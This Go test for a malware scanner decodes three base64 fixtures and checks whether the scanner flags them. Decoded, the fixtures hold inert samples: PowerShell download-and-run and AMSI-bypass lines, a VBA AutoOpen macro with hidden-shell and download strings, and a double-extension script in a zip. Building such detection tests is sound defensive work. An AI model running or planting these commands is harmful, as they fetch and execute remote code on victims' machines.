package main

import (
    "crypto/sha256"
    "encoding/base64"
    "encoding/hex"
    "os"
    "path/filepath"
    "testing"
)

// The original Claude generator describes these three samples as inert:
// - stage_loader.ps1 stores suspicious command strings in a PowerShell here-string.
// - invoice_bundle.zip contains a misleading double-extension JS name.
// - AutoOpenSim.bas only passes text to an inert Debug.Print routine.
//
// This test decodes opaque fixture bytes into t.TempDir, then invokes only
// SentinelGuard's read-only inspection engine. No PowerShell, VBA, JavaScript
// or ZIP entry is ever executed. The generated files are removed by Go tests.
func TestClaudeThreeMissingInertFixtures(t *testing.T) {
    fixtures:=[]struct{
        name string
        size int
        sha string
        encoded string
    }{
        {"stage_loader.ps1",420,"25083162dafa3e415b306ebd39876db077af844c51fdc6cb2509a32da2231a91","IyBJTkVSVCBURVNUIEZJWFRVUkUgLSBubyBvcGVyYXRpb25hbCBiZWhhdmlvcgokaW5kaWNhdG9ycyA9IEAnCiR1ID0gJ2h0dHA6Ly9leGFtcGxlLmludmFsaWQvc3RhZ2UyLnBzMScKSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCR1KQpwb3dlcnNoZWxsIC1Ob1AgLVcgSGlkZGVuIC1FeGVjIEJ5cGFzcwpbUmVmXS5Bc3NlbWJseS5HZXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlscycpCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHUgLU91dEZpbGUgJGVudjpURU1QXHMyLnBzMQonQApXcml0ZS1PdXRwdXQgKCJJbmVydDogc3RvcmVkICIgKyAoJGluZGljYXRvcnMgLXNwbGl0ICJgbiIpLkNvdW50ICsgIiBpbmRpY2F0b3IgbGluZXM7IG5vdGhpbmcgZXhlY3V0ZWQuIikK"},
        {"invoice_bundle.zip",337,"17279c59457a04d8a73c4af55eaec362624a08301bb26ee0413f32addf73eadb","UEsDBBQAAAAIAAAAIVzReFBfMgAAADAAAAAQAAAAc2Nhbl8wMDQyLnBkZi5qc9PXV8jMSy0q4SpLLFJIVLBViFYPL04uUtdRzywo0QvOSM3JUY/Vy8rPzNNQV9e05gIAUEsDBBQAAAAIAAAAIVyR40tPPQAAAD0AAAAKAAAAcmVhZG1lLnR4dAvISU0sTlVIzUtMyklVSM7PK0nNK1EoyVcoy0wtVyjJSFVIyU8uzQUJahRn5pbmJJakpijklBalaupxAQBQSwECFAMUAAAACAAAACFc0XhQXzIAAAAwAAAAEAAAAAAAAAAAAAAAgAEAAAAAc2Nhbl8wMDQyLnBkZi5qc1BLAQIUAxQAAAAIAAAAIVyR40tPPQAAAD0AAAAKAAAAAAAAAAAAAACAAWAAAAByZWFkbWUudHh0UEsFBgAAAAACAAIAdgAAAMUAAAAAAA=="},
        {"AutoOpenSim.bas",402,"3fd7af6de0bf1ccbc78197279c2b119f9a0d3af1dafda3a20340598e2a46edc3","JyBJTkVSVCBURVNUIEZJWFRVUkUgLSBubyBvcGVyYXRpb25hbCBiZWhhdmlvcgpBdHRyaWJ1dGUgVkJfTmFtZSA9ICJBdXRvT3BlblNpbSIKQ29uc3QgUzEgQXMgU3RyaW5nID0gIldTY3JpcHQuU2hlbGwiCkNvbnN0IFMyIEFzIFN0cmluZyA9ICJwb3dlcnNoZWxsIC1ub3AgLXcgaGlkZGVuIC1lbmMgPHBsYWNlaG9sZGVyPiIKQ29uc3QgUzMgQXMgU3RyaW5nID0gIlVSTERvd25sb2FkVG9GaWxlIGh0dHA6Ly9leGFtcGxlLmludmFsaWQvcC5iaW4iClN1YiBBdXRvT3BlbigpCiAgICBNb2NrUnVuIFMxICYgIiB8ICIgJiBTMiAmICIgfCAiICYgUzMKRW5kIFN1YgpQcml2YXRlIFN1YiBNb2NrUnVuKEJ5VmFsIHMgQXMgU3RyaW5nKQogICAgRGVidWcuUHJpbnQgImluZXJ0OiAiICYgTGVuKHMpCkVuZCBTdWIK"},
    }
    dir:=t.TempDir()
    for _,fixture:=range fixtures {
        data,err:=base64.StdEncoding.DecodeString(fixture.encoded)
        if err!=nil {t.Fatalf("fixture %s decode: %v",fixture.name,err)}
        digest:=sha256.Sum256(data)
        if len(data)!=fixture.size||hex.EncodeToString(digest[:])!=fixture.sha {
            t.Fatalf("fixture %s integrity mismatch",fixture.name)
        }
        if err=os.WriteFile(filepath.Join(dir,fixture.name),data,0600);err!=nil {
            t.Fatalf("fixture %s create: %v",fixture.name,err)
        }
    }

    a:=newApp(nil)
    ctx,err:=a.begin("heuristic:custom")
    if err!=nil {t.Fatal(err)}
    err=a.runHeuristic(ctx,"custom",dir)
    a.finish(err)
    if err!=nil {t.Fatal(err)}
    status,findings:=a.snapshot()
    if status.Error!="" || status.Skipped!=0 || status.Files!=int64(len(fixtures)) {
        t.Fatalf("unexpected scan state: files=%d skipped=%d error=%q",status.Files,status.Skipped,status.Error)
    }
    byFile:=map[string]Finding{}
    for _,f:=range findings {byFile[f.Name]=f}
    for _,fixture:=range fixtures {
        if f,ok:=byFile[fixture.name];ok {
            t.Logf("CLAUDE_MISSING_RESULT file=%s detected=true score=%d severity=%s reasons=%q",fixture.name,f.Score,f.Severity,f.Reasons)
        } else {
            t.Logf("CLAUDE_MISSING_RESULT file=%s detected=false score=0",fixture.name)
        }
    }
    t.Logf("CLAUDE_MISSING_TOTAL detected=%d files=%d skipped=%d",len(findings),status.Files,status.Skipped)
}
